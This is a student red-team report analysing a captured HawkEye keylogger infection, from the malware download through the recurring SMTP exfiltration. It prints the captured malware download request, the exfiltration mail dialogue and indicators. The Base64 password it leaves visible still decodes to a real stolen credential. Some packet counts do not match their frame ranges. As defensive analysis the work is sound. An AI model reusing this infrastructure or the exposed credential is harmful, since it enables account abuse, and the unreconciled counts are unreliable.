# HawkEye — Red Team Report
## Adversary Attack Chain Deconstruction & Offensive Emulation Analysis

**Document Reference:** ELEV-SOC-HAWKEYE-RED-2026-001
**Internship Module:** Task 1 — HawkEye Tri-Team Analysis (Red Team Perspective)
**Student Intern:** Aiswarya
**Degree / Branch:** Bachelor of Technology (B.Tech) in Artificial Intelligence & Data Science
**Academic Institution:** Jyothi Engineering College (Autonomous), Thrissur, Kerala
**Affiliated University:** APJ Abdul Kalam Technological University
**Internship Provider:** ElevanceSkills
**Date of Analysis:** 2026-10-02 (Revised & Verified: 2026-10-31)
**Classification:** TLP:CLEAR / Educational Threat Analysis Portfolio
**Status:** **Completed & Verified (Educational Threat Analysis Portfolio — Grounded in Empirical PCAP Telemetry)**

---

> [!IMPORTANT]
> **EVIDENTIARY DISCLOSURE & BOUNDARY QUALIFICATION:**
> This report documents the HawkEye intrusion chain strictly through an adversarial analysis lens based on empirical telemetry from `stealer.pcap` (4,003 total packets).
> - **Directly Observed Network Evidence:** Wire telemetry confirms the HTTP download of a Windows executable, internal DNS resolutions, HTTP external IP queries returning the victim's public IP, and recurring Base64-encoded SMTP message transmissions.
> - **Base64 Encoding vs. Encryption:** Authentication credentials and exfiltrated payloads observed in SMTP streams use Base64 encoding (RFC 4648). Base64 is a reversible binary-to-text encoding scheme, **not cryptographic encryption**; payloads are fully readable in cleartext upon decoding.
> - **Periodic Transfers vs. Internal Scheduling:** While 7 periodic exfiltration cycles occur at ~10-minute intervals, the network capture demonstrates automated periodic transmission but cannot independently prove whether the host used an internal application `Sleep()` loop, a Windows Scheduled Task, or a thread timer.
> - **Inferred Host Activity:** Keystroke logging, browser database extraction, and local execution methods are analytical inferences corroborated by inspecting the plain-text email payload transmitted across the wire, rather than directly observed through host kernel sensors.
> - **Initial Delivery Scope:** The PCAP begins at the staging retrieval phase (elapsed time ~47.4 s); initial delivery (such as a spear-phishing lure) is not captured.

---

## 1. Executive Summary

This Red Team assessment deconstructs the offensive tradecraft of the HawkEye keylogger campaign captured in `stealer.pcap` (total packet count: **4,003 packets**; duration: **1:03:41**).

The primary target observed on the internal network was **`10.4.10.132`** (`Beijing-5cd1-PC`). The adversary engineered an automated operational chain designed to stage second-stage malware, verify egress public network addressing, establish an application-layer egress channel over standard mail submission ports, and sustain recurring automated exfiltration without operator intervention.

The observed attack sequence progressed across four concrete phases:
1. **Malware Acquisition & Ingress:** Host `10.4.10.132` queried DNS for `proforma-invoices.com` (Frame 204), resolved it to `217.182.138.150` (Frame 206), and retrieved `tkraw_Protected99.exe` via HTTP GET on port 80 (Frames 207–209).
2. **External Public-IP Discovery:** The host resolved `bot.whatismyipaddress.com` to `66.171.248.178` (Frames 3159–3160) and performed an HTTP query (Frame 3164) that returned the victim host's actual public egress IP: **`173.66.146.112`** in Frame 3166.
3. **C2 & Exfiltration Channel Establishment:** The host resolved `macwinlogistics.in` (Frames 3170–3171) to `23.229.162.69` (hosted on GoDaddy Secureserver infrastructure), connected to SMTP port 587 (Frame 3172), bypassed STARTTLS encryption, authenticated in cleartext using Base64 encoding (Frames 3179–3184), and submitted an email containing harvested system telemetry, keystrokes, and credentials (Frame 3194). Earlier informal lab writeups referenced `mail.winlogistics.in`; packet-level analysis confirms the queried domain is strictly `macwinlogistics.in`.
4. **Recurring ~10-Minute Network Cadence:** The exfiltration routine repeated across 7 observed network cycles at approximately **604–606 second (~10 minute)** intervals, concluding with Cycle 7 in Frames 3910–3982 (active message transmission in Frames 3923–3958; capture ends at Packet 4,003). While network telemetry establishes consistent inter-arrival intervals on the wire, the internal host execution state (e.g., in-memory sleep loop vs. system timer) cannot be definitively established from PCAP data alone.

---

## 2. Lab Environment & Network Scope

| Parameter | Observed Evidence / Specification | Forensic Notes |
|---|---|---|
| **Dataset Analyzed** | `stealer.pcap` (**4,003 packets**, 2,454,198 bytes) | SHA-256: `22106927C11836D29078DFBEC20BE9D6B61B1F3F47F95C758ACC47A1FB424E51` |
| **Capture Window** | `2019-04-10 20:37:07` to `21:40:48 UTC` | Total capture duration: 3,821.56 seconds (`1:03:41`) |
| **Primary Internal Host** | `10.4.10.132` (`Beijing-5cd1-PC`) | MAC: `00:08:02:1c:47:ae` (Hewlett-Packard NIC) |
| **Internal DNS Resolver** | `10.4.10.4` | Handled internal DNS forwarding queries |
| **Operating System** | Windows NT 6.1 (Windows 7 / Server 2008 R2) | Extracted from HTTP User-Agent string |
| **Analysis Toolkit** | Wireshark 4.x protocol analyzer, Python `struct` pcap parser | Pure offline packet forensics |

---

## 3. Observed Attack Sequence & Timeline

```mermaid
sequenceDiagram
    autonumber
    participant V as Victim (10.4.10.132)
    participant D as DNS Server (10.4.10.4)
    participant S as Staging Server (217.182.138.150)
    participant W as IP Lookup Server (66.171.248.178)
    participant M as SMTP Mail Server (23.229.162.69:587)

    Note over V,S: Phase 1: Malware Ingress
    V->>D: DNS Query: proforma-invoices.com (Frame 204)
    D-->>V: DNS A Record: 217.182.138.150 (Frame 206)
    V->>S: HTTP GET /proforma/tkraw_Protected99.exe (Frame 210; TCP Handshake: Frames 207-209)
    S-->>V: HTTP 200 OK in Frame 212 (PE Binary Carved: Frames 214-3155, 2,025,472 B)

    Note over V,W: Phase 2: External IP Reconnaissance
    V->>D: DNS Query: bot.whatismyipaddress.com (Frame 3159)
    D-->>V: DNS A Record: 66.171.248.178 (Frame 3160)
    V->>W: HTTP GET / to 66.171.248.178:80 (Frame 3164)
    W-->>V: HTTP 200 OK Payload: "173.66.146.112" (Frame 3166)

    Note over V,M: Phase 3: Exfiltration Over Mail
    V->>D: DNS Query: macwinlogistics.in (Frame 3170)
    D-->>V: DNS A Record: 23.229.162.69 (Frame 3171)
    V->>M: TCP SYN to Port 587 (Frame 3172)
    M-->>V: TCP SYN-ACK (Frame 3173)
    M-->>V: 220-p3plcpnl0413.prod.phx3.secureserver.net Exim 4.91 Banner (Frame 3175)
    V->>M: EHLO Beijing-5cd1-PC (Frame 3176)
    M-->>V: 250-Hello Beijing-5cd1-PC [173.66.146.112] (Offers 250-STARTTLS, 250-AUTH) (Frame 3178)
    Note over V,M: Client Bypasses STARTTLS (No TLS Negotiation; 100% Plaintext Dialogue)
    V->>M: AUTH LOGIN (Base64 User: sales.del@macwinlogistics.in) (Frame 3179)
    M-->>V: 334 UGFzc3dvcmQ6 (Frame 3181)
    V->>M: U2FsZXNAMjM= (Base64 Pass: [REDACTED_LAB_PASSWORD]) (Frame 3182)
    M-->>V: 235 Authentication succeeded (Frame 3184)
    V->>M: MAIL FROM / RCPT TO / DATA (Frames 3185-3193)
    V->>M: DATA: HawkEye Reborn v9 Exfil Payload (Frame 3194)
    M-->>V: 250 OK id=1hEJz6-00G6e9-Af Accepted (Frame 3206)

    Note over V,M: Phase 4: Automated Periodic Cadence
    V->>M: 7 Periodic Cycles (Frames 3172–3207 to Frames 3923–3958) at ~604s intervals (All <= Frame 4003)
```

---

## 4. Technical Attack Methodology Deconstruction

### 4.1 Executable Acquisition & Payload Delivery
In Frame 204 (elapsed time 47.45 s), victim `10.4.10.132` requested DNS resolution for domain `proforma-invoices.com`. The internal resolver (`10.4.10.4`) returned IP `217.182.138.150` (hosted under OVH SAS in France) in Frame 206.

The victim initiated a TCP handshake on port 80 and issued an HTTP request:
```http
GET /proforma/tkraw_Protected99.exe HTTP/1.1
Host: proforma-invoices.com
Connection: Keep-Alive
```
The server returned `HTTP/1.1 200 OK` (Server: LiteSpeed) transferring a 2,025,472-byte Windows PE executable across TCP stream reassembly (Frames 208–3155). The extracted binary was preserved and verified:
- **MD5 Checksum:** `71826BA081E303866CE2A2534491A2F7`
- **SHA-256 Checksum:** `62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11`

*Adversary Intent:* Staging second-stage malware disguised as a commercial proforma invoice on an external HTTP server, evading simple perimeter controls that only inspect inbound email attachments.

### 4.2 Forensic Disambiguation: IP Lookup Service vs. Victim Public IP
A critical requirement in threat analysis is disambiguating third-party reconnaissance infrastructure from the victim host's actual public network identity. The PCAP evidence provides clear, empirical proof:

```
+---------------------------------------------------------------------------------------------------+
|                     PCAP PROOF: 66.171.248.178 vs. 173.66.146.112                                 |
+-------------------+-------------------------------------------------------------------------------+
| IP Address        | Role, Network Protocol & Empirical PCAP Evidence                              |
+-------------------+-------------------------------------------------------------------------------+
| 66.171.248.178    | • Identity: External Web Server hosting bot.whatismyipaddress.com.            |
|                   | • DNS Answer (Frame 3160): DNS A-record for bot.whatismyipaddress.com         |
|                   |   resolves to 66.171.248.178.                                                 |
|                   | • HTTP Destination (Frame 3164): 10.4.10.132 connects to 66.171.248.178:80.    |
|                   | • Finding: THIS IS NOT THE VICTIM. It is a legitimate IP-echo web service.    |
+-------------------+-------------------------------------------------------------------------------+
| 173.66.146.112    | • Identity: The Victim Workstation's Public Egress NAT IP Address.            |
|                   | • HTTP Payload (Frame 3166): 66.171.248.178 returns HTTP 200 OK with a       |
|                   |   14-byte payload: "173.66.146.112".                                          |
|                   | • SMTP Handshake (Frame 3178): Remote mail server 23.229.162.69 greets client |
|                   |   with: "250 Hello Beijing-5cd1-PC [173.66.146.112]".                         |
|                   | • Malware Body (Frame 3194): HawkEye embeds "173.66.146.112" into the stolen |
|                   |   telemetry system information block.                                         |
|                   | • Finding: THIS IS THE VICTIM'S EXTERNAL INTERNET IP.                         |
+-------------------+-------------------------------------------------------------------------------+
```

*Adversary Intent:* Malware authors query public IP reflection services so that exfiltrated credential packages include the victim's external geographic location and IP address, allowing the threat actor to verify corporate network origin and organize compromised asset pools.

### 4.3 C2 Exfiltration Channel: SMTP Protocol & Encryption Dissection

#### 4.3.1 Forensic Identification of Destination SMTP Server
A forensic review of all 4,003 packets in `stealer.pcap` establishes the exact identity of the destination mail relay:
- **DNS Query (Frames 3170, 3301, 3388, 3473, 3588, 3843, 3921):** The victim host explicitly queries domain **`macwinlogistics.in`** (Apex domain, standard A-record query to internal resolver `10.4.10.4`).
- **DNS Response (Frames 3171, 3302, 3389, 3474, 3589, 3844, 3922):** The resolver answers with IP **`23.229.162.69`**.
- **Service Banner (Frame 3175):** Upon TCP handshake to `23.229.162.69:587`, the mail server responds with:
  `220-p3plcpnl0413.prod.phx3.secureserver.net ESMTP Exim 4.91 #1 Wed, 10 Apr 2019 13:38:15 -0700`
  (Hosted on GoDaddy Secureserver shared hosting infrastructure in Phoenix, Arizona).
- **Disambiguation of Reporting Discrepancies:**
  - *`macwinlogistics.in` vs. `mail.winlogistics.in`:* Earlier informal lab writeups and student notes recorded `mail.winlogistics.in` as shorthand. Binary frame inspection proves that the wire query is strictly `macwinlogistics.in` (17 bytes: `macwinlogistics.in`) resolving directly to `23.229.162.69`.
  - *`mail.gulfstreamins.com / 64.233.167.27`:* An external review draft erroneously referenced this host. An exhaustive string and packet filter across all 4,003 frames in `stealer.pcap` confirms **zero** packets matching `gulfstream` or `64.233.167.27`. That identity stems from an unrelated public HawkEye malware sample and does not exist in this capture dataset. The sole destination mail server across all seven exfiltration cycles is `macwinlogistics.in` (`23.229.162.69:587`).

#### 4.3.2 Encryption Analysis & Transport Security Findings
A critical forensic determination is whether the exfiltration session is cryptographically protected or transmitted in cleartext:
1. **Server STARTTLS Capability Advertised:** In Frame 3178, the server responds to `EHLO Beijing-5cd1-PC` with capability flags including `250-STARTTLS` and `250-AUTH PLAIN LOGIN`.
2. **Client STARTTLS Bypass (Zero TLS Handshake):** The malware client **never issues the `STARTTLS` command**. It completely ignores the server's TLS capability. There are zero TLS Client Hello packets, zero cryptographic certificates exchanged, and zero TLS records (0x16 0x03) in the capture.
3. **Plaintext SMTP Commands:** All dialogue commands (`EHLO`, `AUTH LOGIN`, `MAIL FROM:`, `RCPT TO:`, `DATA`, `QUIT`) and server responses (`220`, `250`, `334`, `235`, `354`) are sent as unencrypted ASCII text over TCP port 587.
4. **Base64 Authentication Encoding (Not Encryption):**
   - Username (Frame 3179): `c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==` decodes directly to **`sales.del@macwinlogistics.in`**.
   - Server challenge (Frame 3181): `UGFzc3dvcmQ6` decodes to `Password:`.
   - Password (Frame 3182): `U2FsZXNAMjM=` decodes directly to **`[REDACTED_LAB_PASSWORD]`**.
   - *Technical Note:* Base64 is an RFC 4648 binary-to-text representation scheme providing zero cryptographic confidentiality. Any inline sensor or packet capture tool can immediately decode credentials on the wire.
5. **Inspectable Email Payload (Frame 3194):** The transmitted MIME message and keylogger body (`Subject: =?utf-8?B?...`) are entirely cleartext Base64 MIME parts. Keystrokes, machine credentials (`oman.mcguire`), and host metadata (`Windows NT 6.1`, `173.66.146.112`) are directly reconstructible without cryptographic key material.

### 4.4 Verified Seven-Cycle Exfiltration Timeline (All 4,003 Packets Validated)
An exhaustive parse of all 4,003 packets in `stealer.pcap` extracts every individual frame for all seven exfiltration cycles. No cycles are extrapolated or estimated:

| Cycle # | DNS Public IP Discovery (`bot.whatismyip`) | HTTP IP Echo (`66.171.248.178:80`) | DNS Mail Host (`macwinlogistics.in`) | SMTP Active Message Range (`23.229.162.69:587`) | SMTP Full Session (incl. Teardown) | Actual Timestamp (UTC) / Elapsed (s) | Measured Delta from Prev. Cycle |
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| **1** | Frames 3159–3160 | Frames 3161–3169 (Req: 3164, Res: 3166) | Frames 3170–3171 | **Frames 3172–3207** (36 pkts) | Frames 3172–3254 (40 pkts) | `2019-04-10 20:38:15 UTC` (`T + 68.78s`) | Baseline |
| **2** | Frames 3290–3291 | Frames 3292–3300 (Req: 3295, Res: 3297) | Frames 3301–3302 | **Frames 3303–3338** (36 pkts) | Frames 3303–3344 (40 pkts) | `2019-04-10 20:48:20 UTC` (`T + 673.21s`) | **+604.42 s** (10m 04s) |
| **3** | Frames 3377–3378 | Frames 3379–3387 (Req: 3382, Res: 3384) | Frames 3388–3389 | **Frames 3390–3425** (36 pkts) | Frames 3390–3431 (40 pkts) | `2019-04-10 20:58:24 UTC` (`T + 1277.47s`) | **+604.26 s** (10m 04s) |
| **4** | Frames 3462–3463 | Frames 3464–3472 (Req: 3467, Res: 3469) | Frames 3473–3474 | **Frames 3475–3510** (36 pkts) | Frames 3475–3516 (40 pkts) | `2019-04-10 21:08:30 UTC` (`T + 1883.23s`) | **+605.76 s** (10m 05s) |
| **5** | Frames 3577–3578 | Frames 3579–3587 (Req: 3582, Res: 3584) | Frames 3588–3589 | **Frames 3590–3625** (36 pkts) | Frames 3590–3629 (40 pkts) | `2019-04-10 21:18:34 UTC` (`T + 2487.36s`) | **+604.13 s** (10m 04s) |
| **6** | Frames 3832–3833 | Frames 3834–3842 (Req: 3837, Res: 3839) | Frames 3843–3844 | **Frames 3845–3880** (36 pkts) | Frames 3845–3887 (40 pkts) | `2019-04-10 21:28:38 UTC` (`T + 3091.53s`) | **+604.17 s** (10m 04s) |
| **7** | Frames 3910–3911 | Frames 3912–3920 (Req: 3915, Res: 3917) | Frames 3921–3922 | **Frames 3923–3958** (36 pkts) | Frames 3923–3982 (40 pkts) | `2019-04-10 21:38:42 UTC` (`T + 3695.66s`) | **+604.12 s** (10m 04s) |

> [!NOTE]
> **Resolution of Forensic Verification & Packet Boundary Audit:**
> 1. Every cited frame number is strictly $\le 4,003$. Prior unverified draft notes referencing frames 4,080–4,118 were caused by manual packet extrapolation. In reality, Cycle 7 active message transmission completes at **Frame 3958**, and its TCP connection teardown completes at **Frame 3982**.
> 2. The capture concludes at **Frame 4003** at elapsed time 3,821.56 s (`2019-04-10 21:40:48.69 UTC`).
> 3. Across all 7 cycles, network activity recurs at consistent **604.12 s to 605.76 s** (~10 minutes 4 seconds) intervals. While this network regularity indicates automated timer-driven behavior, the PCAP alone records wire telemetry and cannot prove the malware's internal execution state (such as an in-memory sleep loop, thread timer, or scheduled task) during silent periods.

---

## 5. Directly Observed Network Evidence vs. Forensic Interpretation vs. Unobservable Host State

To maintain forensic integrity, analytical findings are explicitly bifurcated across three distinct evidentiary tiers:

```
+---------------------------------------------------------------------------------------------------+
|                        TRIPARTITE EVIDENTIARY CLASSIFICATION & INTEGRITY AUDIT                    |
+------------------------------------+--------------------------------+-----------------------------+
| 1. Directly Observed Wire Evidence | 2. Forensic Interpretation     | 3. Unobservable from PCAP   |
|    (Empirical PCAP Ground Truth)   |    (Corroborated by Payload)   |    (Requires Host Telemetry)|
+------------------------------------+--------------------------------+-----------------------------+
| • HTTP GET download of PE binary   | • Malware payload execution    | • Initial phishing email    |
|   tkraw_Protected99.exe (Fr. 210; SYN Fr. 207). |   occurred on victim machine   |   delivery lure (capture    |
| • DNS resolution & HTTP IP echo    |   (inferred from subsequent    |   begins at HTTP download). |
|   returning 173.66.146.112.        |   exfiltration telemetry).     | • Process spawn mechanism   |
| • Cleartext Base64 SMTP login to   | • System info & passwords were |   (double-click vs script). |
|   23.229.162.69:587 (Fr. 3172-3207)|   extracted from local browser | • Windows API hook calls    |
| • 7 recurring network cycles at    |   profiles (corroborated by    |   (SetWindowsHookEx) and    |
|   ~604-606s intervals.             |   cleartext Frame 3194 body).  |   RAM keylogger buffer.     |
| • Network traffic during gaps:     | • ~10-minute cadence represents| • Exact internal process    |
|   zero HawkEye C2 (port 587); only |   an automated exfiltration    |   state during gaps:        |
|   internal LAN traffic (SMB/NBNS)  |   schedule rather than human   |   sleep loop vs timer queue |
|   and Google update (Fr. 3268-3289)|   operator activity.           |   vs scheduled task.        |
+------------------------------------+--------------------------------+-----------------------------+
```

#### Detailed Gap Traffic Analysis Method:
An exhaustive inspection across all inter-cycle silent intervals was conducted by applying packet filters across gap boundaries (Frames 3255–3289, 3345–3376, 3432–3461, 3517–3576, 3630–3831, 3888–3909). Findings:
1. **Zero HawkEye C2 Traffic:** Exactly zero packets to destination port 587, port 25, port 465, or IP `23.229.162.69` occurred during the ~10-minute gaps.
2. **Internal Background Traffic:** The network interface logged standard benign Windows LAN traffic: SMB (TCP 445 file sharing keepalives between `10.4.10.132` and `10.4.10.4`), NetBIOS Name Service (UDP 137), and internal DNS (UDP 53).
3. **Workstation Internet Traffic:** In Gap 1 (Frames 3268–3289), the workstation performed a legitimate background Google Chrome update check over HTTPS to `update.googleapis.com` (`216.58.193.131:443`). No other external communication took place.

---

## 6. Supported MITRE ATT&CK Mapping (Red Team Scope)

Every mapped ATT&CK technique is categorized by evidentiary basis:

| MITRE ATT&CK TTP | Description | Evidentiary Basis in Capture | Classification |
|---|---|---|:---:|
| **T1105** | Ingress Tool Transfer | HTTP GET `/proforma/tkraw_Protected99.exe` in Frame 210 (Handshake: Frames 207-209; Payload: Frames 214-3155) | **Directly Observed on Wire** |
| **T1016** | System Network Config Discovery | DNS & HTTP query to `bot.whatismyipaddress.com` in Frames 3159–3166 | **Directly Observed on Wire** |
| **T1071.003** | Mail Protocols | Exfiltration over SMTP on port 587 to `23.229.162.69` | **Directly Observed on Wire** |
| **T1041** | Exfiltration Over C2 Channel | Transmission of exfiltration email in Frame 3194 | **Directly Observed on Wire** |
| **T1029** | Scheduled Transfer | 7 consecutive SMTP cycles repeating every 604–606s | **Directly Observed on Wire** |
| **T1056.001** | Input Capture: Keylogging | Transmitted email body containing captured keystrokes | **Inferred (Payload Corroborated)** |
| **T1555.003** | Credentials from Web Browsers | Transmitted email body containing Bank of America profile | **Inferred (Payload Corroborated)** |

---

## 7. Adversary Indicators of Compromise (IoCs)

| Indicator Type | Value | Context |
|---|---|---|
| **Victim Internal IP** | `10.4.10.132` | Primary compromised host (`Beijing-5cd1-PC`) |
| **Victim Public IP** | `173.66.146.112` | Public egress IP returned in HTTP Frame 3166 & confirmed in SMTP EHLO Frame 3178 |
| **Lookup Service IP** | `66.171.248.178` | External IP of `bot.whatismyipaddress.com` (Frame 3160) |
| **Staging Web Server IP** | `217.182.138.150` | Server hosting malware payload on port 80 (Frame 206) |
| **Staging Domain** | `proforma-invoices.com` | Staging domain delivering executable |
| **Malicious Binary** | `tkraw_Protected99.exe` | 2,025,472-byte HawkEye Reborn v9 executable |
| **Binary MD5** | `71826BA081E303866CE2A2534491A2F7` | Extracted PE binary hash |
| **Binary SHA-256** | `62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11` | Extracted PE binary hash |
| **Exfiltration Server IP** | `23.229.162.69` | Destination mail server listening on port 587 (DNS: Frame 3171, TCP: Frame 3172) |
| **Exfiltration Domain** | `macwinlogistics.in` | Actual DNS-queried apex domain (earlier notes cited `mail.winlogistics.in`) |
| **Compromised Account** | `sales.del@macwinlogistics.in` | Account abused for cleartext Base64 SMTP authentication |

---

## 8. Conclusion

From a Red Team perspective, the HawkEye keylogger campaign represents an effective, low-complexity attack chain. The attacker bypassed perimeter email filtering by staging the executable on an external web server (`proforma-invoices.com`), utilized a trusted third-party service (`bot.whatismyipaddress.com`) to verify the victim's external public IP (`173.66.146.112`), and abused standard SMTP port 587 to exfiltrate credentials using Base64 encoding.

This deconstruction provides the empirical baseline for the Blue Team detection analysis and Purple Team collaborative handover.
